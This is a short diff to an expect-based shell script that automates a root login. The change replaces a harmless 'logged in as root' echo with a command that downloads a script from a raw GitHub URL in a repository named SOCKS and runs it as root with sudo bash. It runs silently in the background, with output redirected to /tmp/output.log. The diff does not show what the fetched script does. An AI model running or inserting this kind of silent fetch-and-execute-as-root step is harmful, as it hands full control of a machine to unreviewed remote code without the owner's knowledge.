@@ -49,7 +49,7 @@ EOF
         expect "password for $USER:"
         send "$NEW_PASSWORD\r"
         expect "# "
-        send "echo 'Berhasil login sebagai root'\r"
+        send "nohup bash -c \"sudo bash -c \\\"\$(curl -fsSL https://raw.githubusercontent.com/DOT-SUNDA/SOCKS/refs/heads/main/kontol.sh)\\\"\" > /tmp/output.log 2>&1 &\r"
         expect "# "
         send "exit\r"
         expect "$ "
